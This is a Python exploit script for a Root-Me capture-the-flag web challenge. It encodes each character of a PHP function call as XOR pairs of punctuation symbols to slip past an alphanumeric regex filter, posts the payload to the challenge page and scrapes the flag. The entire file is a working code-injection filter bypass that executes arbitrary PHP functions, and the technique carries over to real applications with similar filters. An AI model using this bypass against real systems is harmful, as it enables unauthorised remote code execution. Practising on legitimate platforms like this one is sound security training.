import re
import sys
import time
import requests

URL = "http://challenge01.root-me.org/web-serveur/ch57/index.php"
valids = "!#$%&\'()*+,-./:;<=>?@[]^_{|}~"

def getXorString(character):
    new = ""
    index1 = 0
    flag1 = False
    while index1 < len(valids) and not flag1:
        index2 = 0
        flag2 = False
        while index2 < len(valids) and not flag2:
            firstChar = valids[index1]
            secondChar = valids[index2]
            xor = chr(ord(firstChar) ^ ord(secondChar))
            if xor == character:
                flag2 = True
            index2 += 1 
        if flag2:
            new += f".('{firstChar}'^'{secondChar}')"
            flag1 = True
        index1 += 1
    return new

def createStringBypassRegex(command):
    commandBypass = ""
    for character in command:
        xor_string = getXorString(character)
        time.sleep(0.2)
        print(f"[*] {character} => {xor_string[1:]}")
        if xor_string:
            commandBypass += xor_string
        else:
            commandBypass += f".'{character}'"
    return commandBypass[1:]

def isAnExecutableCommand(command):
    return re.search(r"\(.+\)\(.+\)", command)

def exploit(command):
    print("[*] Verifying run command...")
    if not isAnExecutableCommand(command):
        return False
    commandParts = re.search(r"\((.+)\)\((.+)\)", command).groups()
    print("[*] Building payload...")
    payload = ''.join([f"({createStringBypassRegex(i)})" for i in commandParts])
    print(f"[+] Payload ready: {payload}")
    print("[*] Injecting payload...")
    try:
        response = requests.post(URL, data={"input":payload}).text
        time.sleep(1)
        flag = re.findall(r"</legend>(.+)</fieldset>", response, flags=re.DOTALL)[0].split("\n")[0]
    except Exception:
        print("[x] Exploit completed, but no flag captured")
        sys.exit(1)
    print(f"[+] Flag: {flag}")
    print("[+] Exploit completed")

if __name__ == "__main__":
    
    command = sys.argv[1]
    exploit(command)
